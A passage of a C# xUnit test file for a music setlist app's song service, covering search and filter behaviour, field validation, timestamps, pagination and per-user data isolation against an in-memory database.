using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using Moq;
using SetlistStudio.Core.Entities;
using SetlistStudio.Core.Interfaces;
using SetlistStudio.Infrastructure.Data;
using SetlistStudio.Infrastructure.Services;
using FluentAssertions;
using Xunit;
using System.Data.Common;

namespace SetlistStudio.Tests.Services;

/// <summary>
/// Advanced tests for SongService targeting specific coverage gaps
/// Focus on error handling, edge cases, and validation scenarios
/// </summary>
public class SongServiceAdvancedTests : IDisposable
{
    private readonly SetlistStudioDbContext _context;
    private readonly Mock<ILogger<SongService>> _mockLogger;
    private readonly Mock<IAuditLogService> _mockAuditLogService;
    private readonly Mock<IQueryCacheService> _mockCacheService;
    private readonly SongService _songService;
    private readonly string _testUserId = "test-user-123";

    public SongServiceAdvancedTests()
    {
        var options = new DbContextOptionsBuilder<SetlistStudioDbContext>()
            .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())
            .Options;

        _context = new SetlistStudioDbContext(options);
        _mockLogger = new Mock<ILogger<SongService>>();
        _mockAuditLogService = new Mock<IAuditLogService>();
        _mockCacheService = new Mock<IQueryCacheService>();
        _songService = new SongService(_context, _mockLogger.Object, _mockAuditLogService.Object, _mockCacheService.Object);
    }

    #region Edge Case and Error Handling Tests

    [Fact]
    public async Task GetSongsAsync_ShouldHandleNullAlbumFields_InSearchFilter()
    {
        // Arrange - Create songs with null albums
        var songsWithNullAlbums = new List<Song>
        {
            new Song { Title = "Song 1", Artist = "Artist 1", Album = null, UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Album = "Album 2", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Album = "", UserId = _testUserId }
        };
        _context.Songs.AddRange(songsWithNullAlbums);
        await _context.SaveChangesAsync();

        // Act - Search for term that might match null album
        var (result, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: "album");

        // Assert - Should only match the song with the actual album
        result.Should().HaveCount(1);
        result.First().Album.Should().Be("Album 2");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleEmptyStringFilters_Gracefully()
    {
        // Arrange
        var songs = new List<Song>
        {
            new Song { Title = "Test Song", Artist = "Test Artist", Genre = "Rock", Tags = "rock, classic", UserId = _testUserId }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act - Use empty strings for all filters
        var (result, totalCount) = await _songService.GetSongsAsync(
            _testUserId, 
            searchTerm: "", 
            genre: "", 
            tags: "");

        // Assert - Should return all songs (filters ignored when empty)
        result.Should().HaveCount(1);
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleWhitespaceFilters_Gracefully()
    {
        // Arrange
        var songs = new List<Song>
        {
            new Song { Title = "Test Song", Artist = "Test Artist", Genre = "Rock", Tags = "rock, classic", UserId = _testUserId }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act - Use whitespace for all filters
        var (result, totalCount) = await _songService.GetSongsAsync(
            _testUserId, 
            searchTerm: "   ", 
            genre: "   ", 
            tags: "   ");

        // Assert - Should return all songs (filters ignored when whitespace)
        result.Should().HaveCount(1);
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetTagsAsync_ShouldHandleNullAndEmptyTagFields()
    {
        // Arrange - Mix of null, empty, and valid tags
        var songs = new List<Song>
        {
            new Song { Title = "Song 1", Artist = "Artist 1", Tags = null, UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Tags = "", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Tags = "rock, blues", UserId = _testUserId },
            new Song { Title = "Song 4", Artist = "Artist 4", Tags = "  jazz  ,  funk  ", UserId = _testUserId }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act
        var tags = await _songService.GetTagsAsync(_testUserId);

        // Assert
        tags.Should().BeEquivalentTo(new[] { "blues", "funk", "jazz", "rock" }, "Should extract and clean tags properly");
    }

    [Fact]
    public async Task GetTagsAsync_ShouldHandleCommaVariations_AndWhitespace()
    {
        // Arrange - Various comma and whitespace scenarios
        var songs = new List<Song>
        {
            new Song { Title = "Song 1", Artist = "Artist 1", Tags = "rock,blues,jazz", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Tags = "pop, dance, electronic", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Tags = "  classical  ,  , opera", UserId = _testUserId },
            new Song { Title = "Song 4", Artist = "Artist 4", Tags = "funk,,soul", UserId = _testUserId }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act
        var tags = await _songService.GetTagsAsync(_testUserId);

        // Assert
        var expectedTags = new[] { "blues", "classical", "dance", "electronic", "funk", "jazz", "opera", "pop", "rock", "soul" };
        tags.Should().BeEquivalentTo(expectedTags, "Should handle various comma and whitespace patterns");
    }

    #endregion

    #region Comprehensive Validation Tests

    [Fact]
    public void ValidateSong_ShouldReturnNullError_WhenSongIsNull()
    {
        // Act
        var errors = _songService.ValidateSong(null!);

        // Assert
        errors.Should().ContainSingle().Which.Should().Be("Song cannot be null");
    }

    [Theory]
    [InlineData(null, "Title")]
    [InlineData("", "Title")]
    [InlineData("   ", "Title")]
    [InlineData(null, "Artist")]
    [InlineData("", "Artist")]
    [InlineData("   ", "Artist")]
    public void ValidateSong_ShouldReturnError_WhenRequiredFieldsAreMissing(string? value, string fieldType)
    {
        // Arrange
        var song = new Song
        {
            Title = fieldType == "Title" ? value ?? string.Empty : "Valid Title",
            Artist = fieldType == "Artist" ? value ?? string.Empty : "Valid Artist",
            UserId = _testUserId
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        var expectedError = fieldType == "Title" ? "Song title is required" : "Artist name is required";
        errors.Should().Contain(expectedError);
    }

    [Theory]
    [InlineData("Title", 201)]
    [InlineData("Artist", 201)]
    [InlineData("Album", 201)]
    [InlineData("Genre", 51)]
    [InlineData("MusicalKey", 11)]
    [InlineData("Notes", 2001)]
    [InlineData("Tags", 501)]
    public void ValidateSong_ShouldReturnError_WhenFieldsExceedMaxLength(string fieldType, int length)
    {
        // Arrange
        var longValue = new string('x', length);
        var song = new Song
        {
            Title = fieldType == "Title" ? longValue : "Valid Title",
            Artist = fieldType == "Artist" ? longValue : "Valid Artist",
            Album = fieldType == "Album" ? longValue : "Valid Album",
            Genre = fieldType == "Genre" ? longValue : "Rock",
            MusicalKey = fieldType == "MusicalKey" ? longValue : "C",
            Notes = fieldType == "Notes" ? longValue : "Valid notes",
            Tags = fieldType == "Tags" ? longValue : "rock, pop",
            UserId = _testUserId
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        var expectedMaxLength = fieldType switch
        {
            "Title" or "Artist" or "Album" => 200,
            "Genre" => 50,
            "MusicalKey" => 10,
            "Notes" => 2000,
            "Tags" => 500,
            _ => 0
        };
        
        var fieldName = fieldType switch
        {
            "Title" => "Song title",
            "Artist" => "Artist name",
            "Album" => "Album name",
            "Genre" => "Genre",
            "MusicalKey" => "Musical key",
            "Notes" => "Notes",
            "Tags" => "Tags",
            _ => fieldType
        };

        errors.Should().Contain($"{fieldName} cannot exceed {expectedMaxLength} characters");
    }

    [Theory]
    [InlineData(39)] // Below minimum BPM
    [InlineData(251)] // Above maximum BPM
    public void ValidateSong_ShouldReturnError_WhenBpmOutOfRange(int bpm)
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            UserId = _testUserId,
            Bpm = bpm
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().Contain("BPM must be between 40 and 250");
    }

    [Theory]
    [InlineData(0)] // Below minimum duration
    [InlineData(3601)] // Above maximum duration (1 hour)
    public void ValidateSong_ShouldReturnError_WhenDurationOutOfRange(int duration)
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            UserId = _testUserId,
            DurationSeconds = duration
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().Contain("Duration must be between 1 second and 1 hour");
    }

    [Theory]
    [InlineData(0)] // Below minimum difficulty
    [InlineData(6)] // Above maximum difficulty
    public void ValidateSong_ShouldReturnError_WhenDifficultyRatingOutOfRange(int rating)
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            UserId = _testUserId,
            DifficultyRating = rating
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().Contain("Difficulty rating must be between 1 and 5");
    }

    [Fact]
    public void ValidateSong_ShouldReturnError_WhenUserIdMissing()
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            UserId = "" // Empty user ID
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().Contain("User ID is required");
    }

    [Fact]
    public void ValidateSong_ShouldReturnNoErrors_WhenAllValidOptionalFieldsProvided()
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            Album = "Valid Album",
            Genre = "Rock",
            MusicalKey = "C",
            Notes = "Some notes",
            Tags = "rock, classic",
            Bpm = 120,
            DurationSeconds = 240,
            DifficultyRating = 3,
            UserId = _testUserId
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().BeEmpty("Valid song should have no validation errors");
    }

    [Fact]
    public void ValidateSong_ShouldReturnNoErrors_WhenOptionalFieldsAreNull()
    {
        // Arrange
        var song = new Song
        {
            Title = "Valid Title",
            Artist = "Valid Artist",
            Album = null,
            Genre = null,
            MusicalKey = null,
            Notes = null,
            Tags = null,
            Bpm = null,
            DurationSeconds = null,
            DifficultyRating = null,
            UserId = _testUserId
        };

        // Act
        var errors = _songService.ValidateSong(song);

        // Assert
        errors.Should().BeEmpty("Song with null optional fields should be valid");
    }

    [Fact]
    public void ValidateSong_ShouldReturnMultipleErrors_WhenMultipleValidationsFail()
    {
        // Arrange
        var song = new Song
        {
            Title = "", // Required field missing
            Artist = new string('x', 201), // Too long
            UserId = "", // Required field missing
            Bpm = 300, // Out of range
            DurationSeconds = 0, // Out of range
            DifficultyRating = 10 // Out of range
        };

        // Act
        var errors = _songService.ValidateSong(song).ToList();

        // Assert
        errors.Should().HaveCountGreaterThan(1, "Multiple validation failures should produce multiple errors");
        errors.Should().Contain("Song title is required");
        errors.Should().Contain("Artist name cannot exceed 200 characters");
        errors.Should().Contain("User ID is required");
        errors.Should().Contain("BPM must be between 40 and 250");
        errors.Should().Contain("Duration must be between 1 second and 1 hour");
        errors.Should().Contain("Difficulty rating must be between 1 and 5");
    }

    #endregion

    #region Error Handling and Exception Tests

    [Fact]
    public async Task CreateSongAsync_ShouldThrowException_WhenValidationFails()
    {
        // Arrange
        var invalidSong = new Song
        {
            Title = "", // Invalid - required field missing
            Artist = "Valid Artist",
            UserId = _testUserId
        };

        // Act & Assert
        await FluentActions.Invoking(() => _songService.CreateSongAsync(invalidSong))
            .Should().ThrowAsync<ArgumentException>()
            .WithMessage("Validation failed: Song title is required");
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldThrowException_WhenValidationFails()
    {
        // Arrange
        var existingSong = new Song
        {
            Title = "Original Title",
            Artist = "Original Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(existingSong);
        await _context.SaveChangesAsync();

        var invalidUpdate = new Song
        {
            Id = existingSong.Id,
            Title = "", // Invalid - required field missing
            Artist = "Updated Artist",
            UserId = _testUserId
        };

        // Act & Assert
        await FluentActions.Invoking(() => _songService.UpdateSongAsync(invalidUpdate, _testUserId))
            .Should().ThrowAsync<ArgumentException>()
            .WithMessage("Validation failed: Song title is required");
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldUpdateTimestamp_WhenUpdateSucceeds()
    {
        // Arrange
        var originalTime = DateTime.UtcNow.AddHours(-1);
        var existingSong = new Song
        {
            Title = "Original Title",
            Artist = "Original Artist",
            UserId = _testUserId,
            CreatedAt = originalTime,
            UpdatedAt = null
        };
        _context.Songs.Add(existingSong);
        await _context.SaveChangesAsync();

        var updatedSong = new Song
        {
            Id = existingSong.Id,
            Title = "Updated Title",
            Artist = "Updated Artist",
            UserId = _testUserId
        };

        // Act
        var result = await _songService.UpdateSongAsync(updatedSong, _testUserId);

        // Assert
        result.Should().NotBeNull();
        result!.UpdatedAt.Should().NotBeNull("UpdatedAt should be set when song is updated");
        result.UpdatedAt.Should().BeCloseTo(DateTime.UtcNow, TimeSpan.FromMinutes(1));
        result.CreatedAt.Should().Be(originalTime, "CreatedAt should not change during update");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldSetTimestamps_WhenCreatingNewSong()
    {
        // Arrange
        var newSong = new Song
        {
            Title = "New Song",
            Artist = "New Artist",
            UserId = _testUserId
        };

        // Act
        var result = await _songService.CreateSongAsync(newSong);

        // Assert
        result.CreatedAt.Should().BeCloseTo(DateTime.UtcNow, TimeSpan.FromMinutes(1));
        result.UpdatedAt.Should().BeNull("UpdatedAt should be null for new songs");
    }

    #endregion

    #region Filtering Tests - RED PHASE (These will FAIL until implementation)

    [Fact]
    public async Task GetSongsAsync_ShouldFilterBySearchTerm_WhenSearchingTitle()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Stairway to Heaven", Artist = "Led Zeppelin", UserId = _testUserId },
            new Song { Title = "Highway to Hell", Artist = "AC/DC", UserId = _testUserId },
            new Song { Title = "Bohemian Rhapsody", Artist = "Queen", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "Heaven";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.First().Title.Should().Contain("Heaven");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldFilterBySearchTerm_WhenSearchingArtist()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Guns N' Roses", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Metallica", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Guns N' Roses", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "Guns";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        songs.Should().OnlyContain(s => s.Artist.Contains("Guns"));
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldFilterBySearchTerm_WhenSearchingAlbum()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Album = "Thriller", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Album = "Dangerous", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Album = "Thriller", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "Thriller";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        songs.Should().OnlyContain(s => s.Album == "Thriller");
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldBeCaseInsensitive_WhenSearching()
    {
        // Arrange
        _context.Songs.Add(new Song 
        { 
            Title = "Sweet Child O' Mine", 
            Artist = "Guns N' Roses", 
            UserId = _testUserId 
        });
        await _context.SaveChangesAsync();
        var searchTerm = "SWEET CHILD"; // All uppercase

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.First().Title.Should().Be("Sweet Child O' Mine");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldFilterByGenre_WhenGenreProvided()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Rock Song 1", Artist = "Artist 1", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Jazz Song 1", Artist = "Artist 2", Genre = "Jazz", UserId = _testUserId },
            new Song { Title = "Rock Song 2", Artist = "Artist 3", Genre = "Rock", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var genre = "Rock";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        songs.Should().OnlyContain(s => s.Genre == "Rock");
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldFilterByTags_WhenTagsProvided()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Tags = "classic,rock,80s", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Tags = "modern,pop", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Tags = "classic,jazz", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var tags = "classic";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, tags: tags);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        songs.Should().OnlyContain(s => s.Tags != null && s.Tags.Contains("classic"));
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldCombineFilters_WhenMultipleFiltersProvided()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Rock Classic 1", Artist = "Classic Rockers", Genre = "Rock", Tags = "classic", UserId = _testUserId },
            new Song { Title = "Rock Classic 2", Artist = "Classic Rockers", Genre = "Rock", Tags = "modern", UserId = _testUserId },
            new Song { Title = "Jazz Classic", Artist = "Classic Jazzers", Genre = "Jazz", Tags = "classic", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "Classic";
        var genre = "Rock";
        var tags = "classic";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm, genre: genre, tags: tags);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.First().Title.Should().Be("Rock Classic 1");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldOnlyReturnUserSongs_WhenFilteringWithOtherUserData()
    {
        // Arrange
        var otherUserId = "other-user-456";
        _context.Songs.AddRange(
            new Song { Title = "My Song", Artist = "My Artist", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Other Song", Artist = "Other Artist", Genre = "Rock", UserId = otherUserId }
        );
        await _context.SaveChangesAsync();
        var genre = "Rock";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.Should().OnlyContain(s => s.UserId == _testUserId);
        songs.First().Title.Should().Be("My Song");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleEmptySearchTerm_ReturningAllSongs()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleWhitespaceSearchTerm_ReturningAllSongs()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "   ";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2);
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnEmpty_WhenSearchTermNotFound()
    {
        // Arrange
        _context.Songs.Add(new Song { Title = "Song 1", Artist = "Artist 1", UserId = _testUserId });
        await _context.SaveChangesAsync();
        var searchTerm = "NonexistentTerm12345";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().BeEmpty();
        totalCount.Should().Be(0);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnEmpty_WhenGenreNotFound()
    {
        // Arrange
        _context.Songs.Add(new Song { Title = "Song 1", Artist = "Artist 1", Genre = "Rock", UserId = _testUserId });
        await _context.SaveChangesAsync();
        var genre = "Country";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().BeEmpty();
        totalCount.Should().Be(0);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleSongsWithNullTags_WhenFilteringByTags()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Tags = "classic", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Tags = null, UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var tags = "classic";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, tags: tags);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.First().Tags.Should().Contain("classic");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleSpecialCharacters_InSearchTerm()
    {
        // Arrange
        _context.Songs.Add(new Song 
        { 
            Title = "Sweet Child O' Mine", 
            Artist = "Artist", 
            UserId = _testUserId 
        });
        await _context.SaveChangesAsync();
        var searchTerm = "O' Mine"; // Contains apostrophe

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().ContainSingle();
        songs.First().Title.Should().Contain("O' Mine");
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldRespectPagination_WhenFiltering()
    {
        // Arrange
        _context.Songs.AddRange(
            Enumerable.Range(1, 10).Select(i => new Song
            {
                Title = $"Rock Song {i}",
                Artist = $"Artist {i}",
                Genre = "Rock",
                UserId = _testUserId
            })
        );
        await _context.SaveChangesAsync();
        var genre = "Rock";
        var pageNumber = 1;
        var pageSize = 3;

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre, pageNumber: pageNumber, pageSize: pageSize);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(3);
        totalCount.Should().Be(10);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldOrderResults_AfterFiltering()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song C", Artist = "Artist Z", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Song A", Artist = "Artist A", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Song B", Artist = "Artist M", Genre = "Rock", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var genre = "Rock";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);

        // Assert
        var songList = songs.ToList();
        songList.Should().HaveCount(3);
        songList[0].Artist.Should().Be("Artist A"); // Ordered by Artist
        songList[1].Artist.Should().Be("Artist M");
        songList[2].Artist.Should().Be("Artist Z");
        totalCount.Should().Be(3);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldPerformWell_WithLargeFilteredDataset()
    {
        // Arrange - Add 1000 songs
        var songs = Enumerable.Range(1, 1000).Select(i => new Song
        {
            Title = $"Performance Song {i}",
            Artist = $"Artist {i % 10}",
            Genre = i % 2 == 0 ? "Rock" : "Pop",
            Tags = $"tag{i % 5}",
            UserId = _testUserId
        }).ToList();
        await _context.Songs.AddRangeAsync(songs);
        await _context.SaveChangesAsync();
        var genre = "Rock";

        // Act
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();
        var (result, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);
        stopwatch.Stop();

        // Assert
        result.Should().NotBeNull();
        totalCount.Should().Be(500); // Half are Rock
        stopwatch.ElapsedMilliseconds.Should().BeLessThan(1000); // Should complete within 1 second
    }

    #endregion

    #region GetArtistsAsync Tests - CRITICAL COVERAGE GAP (Currently 0%)

    [Fact]
    public async Task GetArtistsAsync_ShouldReturnDistinctArtists_WhenMultipleSongsExist()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Guns N' Roses", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Queen", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Guns N' Roses", UserId = _testUserId },
            new Song { Title = "Song 4", Artist = "Led Zeppelin", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache service mock to execute callback
        _mockCacheService.Setup(x => x.GetArtistsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var artists = await _songService.GetArtistsAsync(_testUserId);

        // Assert
        artists.Should().NotBeNull();
        artists.Should().HaveCount(3);
        artists.Should().BeEquivalentTo(new[] { "Guns N' Roses", "Led Zeppelin", "Queen" });
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldReturnOrderedList_AlphabeticallyByArtist()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Metallica", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "AC/DC", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Queen", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache service mock
        _mockCacheService.Setup(x => x.GetArtistsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var artists = await _songService.GetArtistsAsync(_testUserId);

        // Assert
        var artistList = artists.ToList();
        artistList[0].Should().Be("AC/DC");
        artistList[1].Should().Be("Metallica");
        artistList[2].Should().Be("Queen");
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldOnlyReturnUserArtists_WhenMultipleUsersExist()
    {
        // Arrange
        var otherUserId = "other-user-789";
        _context.Songs.AddRange(
            new Song { Title = "My Song", Artist = "Guns N' Roses", UserId = _testUserId },
            new Song { Title = "Other Song", Artist = "Other Artist", UserId = otherUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache service mock
        _mockCacheService.Setup(x => x.GetArtistsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var artists = await _songService.GetArtistsAsync(_testUserId);

        // Assert
        artists.Should().ContainSingle();
        artists.Should().Contain("Guns N' Roses");
        artists.Should().NotContain("Other Artist");
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldReturnEmpty_WhenUserHasNoSongs()
    {
        // Arrange
        var emptyUserId = "empty-user-999";

        // Setup cache service mock
        _mockCacheService.Setup(x => x.GetArtistsAsync(emptyUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var artists = await _songService.GetArtistsAsync(emptyUserId);

        // Assert
        artists.Should().NotBeNull();
        artists.Should().BeEmpty();
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldExcludeEmptyArtists_WhenSomeArtistsAreEmpty()
    {
        // Arrange - Artist is required field, so we test empty string exclusion
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Metallica", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache service mock
        _mockCacheService.Setup(x => x.GetArtistsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var artists = await _songService.GetArtistsAsync(_testUserId);

        // Assert
        artists.Should().ContainSingle();
        artists.Should().Contain("Metallica");
    }

    #endregion

    #region GetSongByIdAsync Additional Coverage Tests

    [Fact]
    public async Task GetSongByIdAsync_ShouldReturnNull_WhenSongNotFound()
    {
        // Arrange
        var nonExistentId = 99999;

        // Act
        var result = await _songService.GetSongByIdAsync(nonExistentId, _testUserId);

        // Assert
        result.Should().BeNull();
    }

    [Fact]
    public async Task GetSongByIdAsync_ShouldReturnNull_WhenSongBelongsToOtherUser()
    {
        // Arrange
        var otherUserId = "other-user-999";
        var song = new Song
        {
            Title = "Other User Song",
            Artist = "Other Artist",
            UserId = otherUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act - Try to access other user's song
        var result = await _songService.GetSongByIdAsync(song.Id, _testUserId);

        // Assert
        result.Should().BeNull("should not return songs belonging to other users");
    }

    [Fact]
    public async Task GetSongByIdAsync_ShouldReturnSong_WhenSongExistsAndBelongsToUser()
    {
        // Arrange
        var song = new Song
        {
            Title = "Bohemian Rhapsody",
            Artist = "Queen",
            Album = "A Night at the Opera",
            Genre = "Rock",
            Bpm = 72,
            MusicalKey = "Bb",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act
        var result = await _songService.GetSongByIdAsync(song.Id, _testUserId);

        // Assert
        result.Should().NotBeNull();
        result!.Title.Should().Be("Bohemian Rhapsody");
        result.Artist.Should().Be("Queen");
        result.UserId.Should().Be(_testUserId);
    }

    #endregion

